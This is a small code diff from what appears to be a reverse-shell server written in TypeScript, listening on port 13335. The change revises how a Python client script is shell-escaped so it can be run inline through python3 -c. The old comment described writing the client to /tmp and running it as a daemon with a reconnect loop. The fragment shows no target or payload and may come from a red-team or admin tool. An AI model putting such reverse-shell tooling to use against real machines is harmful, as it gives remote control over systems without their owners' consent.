@@ -11,8 +11,9 @@ const PORT = 13335;
 const reverseShellServer = net.createServer();
 const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');
 
-// Bootstrap command: write client.py to /tmp and run as daemon with reconnect loop
-const escapedScript = script.replace(/\\/g, '\\\\').replace(/'/g, "'\\''");
+// Bootstrap command: run client.py inline via python3 -c
+// In shell single quotes, only single quotes need escaping; backslashes are literal
+const escapedScript = script.replace(/'/g, "'\\''");
 
 const sanitizeInput = (s: string) => s.replace(/[\x00-\x1f\x7f]/g, '');
 const normalizeIp = (ip: string) => {
